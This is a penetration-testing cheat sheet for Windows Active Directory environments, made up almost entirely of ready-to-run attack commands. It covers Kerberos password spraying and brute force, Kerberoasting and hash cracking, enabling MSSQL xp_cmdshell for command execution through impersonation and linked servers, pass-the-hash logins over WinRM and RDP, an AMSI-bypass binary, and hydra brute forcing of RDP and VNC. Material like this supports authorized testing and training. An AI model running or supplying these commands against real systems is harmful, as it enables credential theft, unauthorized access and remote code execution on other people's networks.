- PowerView Cheat Sheet
### Shares
```
SYSVOL ⇒ AD stuff (GPOs, logon scripts) C:\Windows\SYSVOL on DC
C ⇒ C:\
IPC ⇒ enumeration (admin scripts, event logs, etc)

dir \\[domain or ip]\[share] /user:[username] [password]
Note: domain ⇒ kerberos auth vs ip ⇒ NTLM auth
net use [drive letter]: \\[domain]\[share] /user:[username] [password] /persistent:yes
```
### LDAP
```
ldapdomaindump ldap://<HOST> -u '<DOMAIN>\<USER>' -p <PASSWORD> -o <DIR>
```
```
ldapsearch -x -H ldap://<HOST> -b base namingcontexts
```
```
ldapsearch -x -H ldap://<HOST> -D '<DOMAIN>\<USER>' -w <PASSWORD> -b "DC=<SUBDOMAIN>,DC=<TLD>"
```
### Kerberos
```
kerbrute userenum --dc <DC_IP> -d <DOMAIN> <USERLIST> # run with --downgrade if there are issues
```
```
kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> <USERLIST> <PASSWORD>
```
```
kerbrute bruteuser --dc <DC_IP> -d <DOMAIN> <PASSLIST> <USER>
```
```
kerbrute bruteforce --dc <DC_IP> -d <DOMAIN> <CREDSLIST> #credslist contains user:pass on each line
```
- Step-1 Enumeration Identify SPNs (Service Principal Names) using tools like impacket or PowerShell to query for accoutns with SPNs
```
#Impacket
python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
```
```
#Powershell with PowerView
Get-domainUser -SPN
```
- Step 2 Extract kerberos tickets by using the spns to request service tickets (TGS) from the kerberos protocol
```
#Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt
```
```
#Impacket
python3 GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -request -outputfile hashes.txt
```
```
#Invoke-Kerberoast
Invoke-Kerberoast -OutputFormat Hashcat | Out-File -Encoding ASCII hashes.txt
```
- Step 3 Crack the hash
```
#Hashcat
hashcat -m 1310 -a 0 hashes.txt wordlist.txt
```
```
#John
john --wordlist=wordlist.txt hashes.txt
```
### SQL
- MySQL
```
mysql -h <HOST> -P <PORT> -u <USERNAME> -p '<PASSWORD>'
```
- PostgreSQL
```
PGPASSWORD=<PASSWORD> pgsql -h <HOST> -p <PORT> -U <USERNAME>
```
### MSSQL
- Impacket
```
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<HOST> -port <PORT> -windows-auth
```
- Interesting functions
```
use master;
EXEC sp_helprotect 'xp_cmdshell';
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
- Command Execution
```
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
EXEC sp_configure 'show advanced options', '1';  
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell <COMMAND>;
```
- Impersonate
```
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
EXECUTE AS login = '<USER>'; <QUERY>;
EXECUTE AS login = '<USER>'; EXEC xp_cmdshell '<COMMAND>';
```
- Over Link
```
SELECT srvname, srvproduct, rpcout FROM master..sysservers;
SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');
SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''[command]''');
Note: When using xp_cmdshell with OpenQuery, prepend a dummy query before it or else it won’t work
```
### NFS
```
rpcinfo -p <HOST>
```
```
showmount -e <HOST>
```
```
mount <HOST>:<SHARE> /mnt/<DIR>
```
```
unmount /mnt/<DIR>
```
### WinRM
```
crackmapexec winrm <HOSTS> -u <USERNAME> -p <PASSWORD>
```
```
evil-winrm -i <HOST> -u <USERNAME> -p <PASSWORD>
```
```
evil-winrm -i <HOST> -u <USERNAME> -H <HASH>
```
```
KRB5CCNAME=[ticket].ccache
```
```
evil-winrm -i <HOST> -r <DOAMIN> -u <USERNAME>
```
- port 5985 is plaintest
- port 5986 is encrypted
- If port 5986 is open 
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -S
```
- Login with hash
```
evil-winrm -i <IP> -u <USERNAME> -H <NTLM_HASH>
```
- Login with key (c for public key and k for private key)
```
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
```
- Logs
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -l
```
- Running a binary example
```
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD> -e /opt/privsc/Bypass-4MSI
menu
Invoke-binary /opt/privsc/winPEASx64.exe
```
### RDP
```
xfreerdp /u:<DOMAIN>\\<USERNAME> /p:<PASSWORD> /v:<HOST> +clipboard /drive:<WINDOWS_SHARE_NAME>,<KALI_FOLDER>
```
```
xfreerdp /u:<DOMAIN?\\<USERNAME> /pth:<HASH> /v:<HOST> +clipboard /drive:<WINDOWS_SHARE_NAME>,<KALI_FOLDER>
```
```
rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <HOST>
```
- RDP brute force
```
hydra -l <USERNAME> -P <PASSWORD_LIST> -s <PORT> rdp://<HOST>
```
### VNC
```
vncviewer <HOST>:<PORT> -passwd <PASSWORD_FILE>
```
- VNC brute force
```
hydra -s <PORT> -P <PASSWORD_LIST> -t 4 <HOST> vnc
```